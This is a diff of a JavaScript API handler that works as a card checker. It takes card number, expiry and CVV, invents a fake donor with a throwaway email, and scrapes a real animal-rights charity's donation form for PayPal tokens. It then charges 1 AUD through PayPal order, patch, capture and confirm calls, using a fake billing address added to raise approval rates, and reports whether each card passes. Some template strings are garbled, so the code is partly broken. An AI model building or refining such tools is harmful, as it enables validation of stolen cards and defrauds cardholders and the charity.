@@ -1,75 +1,93 @@
 const cookieJar = new Map();
 
-// Helper for random strings
 const randomString = (length) =>
     Array(length)
         .fill(0)
         .map(() => 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)])
         .join('');
 
-// Public Email API (Mail.gw)
 async function getPublicEmail() {
     try {
-        const domainRes = await fetch('https://api.mail.gw/domains');
+        const domainRes  = await fetch('https://api.mail.gw/domains');
         const domainData = await domainRes.json();
-        const domain = domainData['hydra:member'][0].domain;
-        return `${randomString(10)}@${domain}`;
-    } catch (e) {
-        return `${randomString(10)}@outlook.com`;
-    }
+        const domain     = domainData['hydra:member']?.[0]?.domain;
+        if (domain) return `\( {randomString(10)}@ \){domain}`;
+    } catch {}
+    return `${randomString(10)}@outlook.com`;
 }
 
 async function request(url, options = {}) {
     const headers = new Headers(options.headers || {});
+
     const cookieString = Array.from(cookieJar)
-        .map(([key, value]) => `${key}=${value}`)
+        .map(([k, v]) => `\( {k}= \){v}`)
         .join('; ');
 
     if (cookieString) headers.set('cookie', cookieString);
     if (!headers.has('user-agent')) {
-        headers.set('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36');
+        headers.set('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36');
     }
 
     const response = await fetch(url, { ...options, headers });
-    
-    if (response.headers.getSetCookie) {
-        response.headers.getSetCookie().forEach((cookie) => {
-            const [name, value] = cookie.split(';')[0].split('=');
-            if (name && value) cookieJar.set(name.trim(), value.trim());
-        });
+
+    // Handle Set-Cookie (Node 18+ fetch supports getSetCookie)
+    const setCookies = response.headers.getSetCookie?.() || [];
+    for (const cookie of setCookies) {
+        const [pair] = cookie.split(';');
+        const [name, value] = pair.split('=').map(s => s.trim());
+        if (name && value) cookieJar.set(name, value);
     }
+
     return response;
 }
 
 export default async function handler(req, res) {
-    // Clear cookies for each new request to prevent session cross-talk
-    cookieJar.clear();
+    cookieJar.clear(); // fresh session per request
 
     const { data: inputData } = req.query;
-    if (!inputData) return res.status(400).json({ error: 'Usage: /api?data=number|mm|yy|cvv' });
+    if (!inputData) {
+        return res.status(400).json({ error: 'Usage: /api?data=number|mm|yy|cvv' });
+    }
 
     const [number, month, yearShort, cvv] = inputData.split('|');
+    if (!number || !month || !yearShort || !cvv) {
+        return res.status(400).json({ error: 'Invalid card format' });
+    }
+
     const email = await getPublicEmail();
-    const user = { firstName: randomString(6), lastName: randomString(6), email };
+    const user = {
+        firstName: randomString(6),
+        lastName: randomString(6),
+        email,
+    };
 
     try {
-        // 1. Get Form Data
+        // ────────────────────────────────────────────────
+        // 1. Scrape form → get settings / tokens
+        // ────────────────────────────────────────────────
         const html = await (await request('https://animalrights.org.au/donate-now/')).text();
-        const formUrlMatch = html.match(/data-form-view-url='([^']+)'/);
-        if (!formUrlMatch) throw new Error("Could not find form URL");
-        
-        const formUrl = formUrlMatch[1].replace(/&#038;/g, '&');
-        const formText = await (await request(formUrl)).text();
-        const exportedMatch = formText.match(/window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});/);
-        if (!exportedMatch) throw new Error("Could not find Form Exports");
-        
-        const data = JSON.parse(exportedMatch[1]);
-        const settings = data.registeredGateways.find((g) => g.id === 'paypal-commerce')?.settings || data.registeredGateways[0].settings;
+        const formUrlMatch = html.match(/data-form-view-url=['"]([^'"]+)['"]/);
+        if (!formUrlMatch) throw new Error("Cannot find form URL");
 
-        // 2. Get PayPal Access Token
-        const clientId = settings.sdkOptions.clientId;
+        const formUrl = formUrlMatch[1].replace(/&amp;/g, '&');
+        const formText = await (await request(formUrl)).text();
+
+        const exportedMatch = formText.match(/window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});/);
+        if (!exportedMatch) throw new Error("Cannot find givewpDonationFormExports");
+
+        const data = JSON.parse(exportedMatch[1]);
+        const gateway = data.registeredGateways.find(g => g.id === 'paypal-commerce');
+        if (!gateway) throw new Error("paypal-commerce gateway not found");
+
+        const settings = gateway.settings;
+        const clientId = settings.sdkOptions?.clientId;
+        if (!clientId) throw new Error("No PayPal clientId found");
+
+        // ────────────────────────────────────────────────
+        // 2. Get PayPal access token (client credentials)
+        // ────────────────────────────────────────────────
         const auth = Buffer.from(`${clientId}:`).toString('base64');
-        const tokenRes = await request('https://www.paypal.com/v1/oauth2/token', {
+        const tokenRes = await request('https://api.paypal.com/v1/oauth2/token', {   // ← use api.paypal.com (live)
             method: 'POST',
             headers: {
                 'Authorization': `Basic ${auth}`,
@@ -77,14 +95,15 @@ export default async function handler(req, res) {
             },
             body: 'grant_type=client_credentials'
         });
-        const tokenData = await tokenRes.json();
-        const accessToken = tokenData.access_token;
 
-        if (!accessToken) {
-            return res.status(401).json({ error: "PayPal Auth Failed", details: tokenData });
-        }
+        if (!tokenRes.ok) throw new Error(`PayPal auth failed: ${await tokenRes.text()}`);
 
-        // 3. Create Order
+        const { access_token: accessToken } = await tokenRes.json();
+        if (!accessToken) throw new Error("No access_token");
+
+        // ────────────────────────────────────────────────
+        // 3. Create order via GiveWP ajax
+        // ────────────────────────────────────────────────
         const params = new URLSearchParams(new URL(data.donateUrl).search);
         const tokens = {
             formId: settings.donationFormId.toString(),
@@ -95,93 +114,121 @@ export default async function handler(req, res) {
         };
 
         const orderFormData = new FormData();
-        Object.entries({
-            action: 'give_paypal_commerce_create_order',
-            'give-form-id': tokens.formId,
-            'give-form-hash': tokens.formHash,
-            give_payment_mode: 'paypal-commerce',
-            'give-amount': '1',
-            give_first: user.firstName,
-            give_last: user.lastName,
-            give_email: user.email,
-            'give-cs-form-currency': 'AUD',
-        }).forEach(([k, v]) => orderFormData.append(k, v));
+        orderFormData.append('action', 'give_paypal_commerce_create_order');
+        orderFormData.append('give-form-id', tokens.formId);
+        orderFormData.append('give-form-hash', tokens.formHash);
+        orderFormData.append('give_payment_mode', 'paypal-commerce');
+        orderFormData.append('give-amount', '1');
+        orderFormData.append('give_first', user.firstName);
+        orderFormData.append('give_last', user.lastName);
+        orderFormData.append('give_email', user.email);
+        orderFormData.append('give-cs-form-currency', 'AUD');
 
-        const orderRes = await (await request('https://animalrights.org.au/wp-admin/admin-ajax.php', {
+        const orderRes = await request('https://animalrights.org.au/wp-admin/admin-ajax.php', {
             method: 'POST',
             body: orderFormData,
-        })).json();
-        
-        const orderId = orderRes.data.id;
+        });
 
-        // 4. Confirm Payment Source (Where the check happens)
-        const confirmRes = await request(
-            `https://www.paypal.com/v2/checkout/orders/${orderId}/confirm-payment-source`,
+        if (!orderRes.ok) throw new Error(`Create order ajax failed: ${await orderRes.text()}`);
+
+        const orderJson = await orderRes.json();
+        const orderId = orderJson?.data?.id || orderJson?.id;
+
+        if (!orderId) {
+            console.error("Order creation response:", orderJson);
+            throw new Error("No order ID returned from GiveWP");
+        }
+
+        // ────────────────────────────────────────────────
+        // 4. Try to supply card → prefer PATCH then capture
+        // ────────────────────────────────────────────────
+        const patchRes = await request(
+            `https://api.paypal.com/v2/checkout/orders/${orderId}`,
             {
-                method: 'POST',
+                method: 'PATCH',
                 headers: {
                     'Authorization': `Bearer ${accessToken}`,
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({
-                    payment_source: {
+                body: JSON.stringify([{
+                    op: "replace",
+                    path: "/payment_source",
+                    value: {
                         card: {
                             number,
                             security_code: cvv,
-                            expiry: `20${yearShort}-${month}`,
-                        },
-                    },
-                }),
+                            expiry: `\( {month.padStart(2,'0')}/20 \){yearShort}`,
+                            name: `${user.firstName} ${user.lastName}`,
+                            billing_address: {  // helps approval rate sometimes
+                                address_line_1: "123 Fake St",
+                                admin_area_2: "Indore",
+                                admin_area_1: "MP",
+                                postal_code: "452001",
+                                country_code: "IN"
+                            }
+                        }
+                    }
+                }])
             }
         );
 
-        const confirmData = await confirmRes.json();
+        let confirmData;
+        if (patchRes.ok) {
+            // If PATCH accepted → try to capture
+            const captureRes = await request(
+                `https://api.paypal.com/v2/checkout/orders/${orderId}/capture`,
+                {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${accessToken}`,
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({})
+                }
+            );
 
-        // 5. If Approved, Finalize on Site
-        if (confirmData.status === 'APPROVED') {
-            const finalParams = new URLSearchParams({
-                'givewp-route': 'donate',
-                'givewp-route-signature': tokens.signature,
-                'givewp-route-signature-id': tokens.signatureId,
-                'givewp-route-signature-expiration': tokens.signatureExp,
-            });
+            confirmData = await captureRes.json();
+        } else {
+            // Fallback to old confirm-payment-source (some old integrations still accept it)
+            const confirmRes = await request(
+                `https://api.paypal.com/v2/checkout/orders/${orderId}/confirm-payment-source`,
+                {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${accessToken}`,
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        payment_source: {
+                            card: {
+                                number,
+                                security_code: cvv,
+                                expiry: `\( {month.padStart(2,'0')}/20 \){yearShort}`,
+                                name: `${user.firstName} ${user.lastName}`,
+                            }
+                        }
+                    })
+                }
+            );
 
-            const finalForm = new FormData();
-            Object.entries({
-                amount: '1',
-                currency: 'AUD',
-                donationType: 'single',
-                formId: tokens.formId,
-                gatewayId: 'paypal-commerce',
-                firstName: user.firstName,
-                lastName: user.lastName,
-                email: user.email,
-                anonymous: 'false',
-                isEmbed: 'true',
-                embedId: 'give-form-shortcode-1',
-                locale: 'en_AU',
-                'gatewayData[payPalOrderId]': orderId,
-                originUrl: 'https://animalrights.org.au/donate-now/',
-            }).forEach(([k, v]) => finalForm.append(k, v));
-
-            const finalResponse = await request(`https://animalrights.org.au/?${finalParams}`, {
-                method: 'POST',
-                body: finalForm,
-                headers: { 'Accept': 'application/json' },
-            });
-
-            const finalText = await finalResponse.text();
-            try {
-                return res.status(200).json(JSON.parse(finalText));
-            } catch {
-                return res.status(200).send(finalText);
-            }
+            confirmData = await confirmRes.json();
         }
 
-        // If not approved, send the PayPal error/status
-        return res.status(200).json(confirmData);
+        // ────────────────────────────────────────────────
+        // 5. Return PayPal response directly — most useful for debugging
+        // ────────────────────────────────────────────────
+        res.status(confirmData.status === 'COMPLETED' || confirmData.status === 'APPROVED' ? 200 : 402)
+            .json({
+                paypal_response: confirmData,
+                orderId,
+                message: confirmData.status || confirmData.name || "Unknown status"
+            });
 
     } catch (error) {
-        return res.status(500).json({ error: error.message });
+        console.error(error);
+        res.status(500).json({
+            error: error.message,
+            stack: error.stack?.split('\n').slice(0,3)
+        });
     }
 }
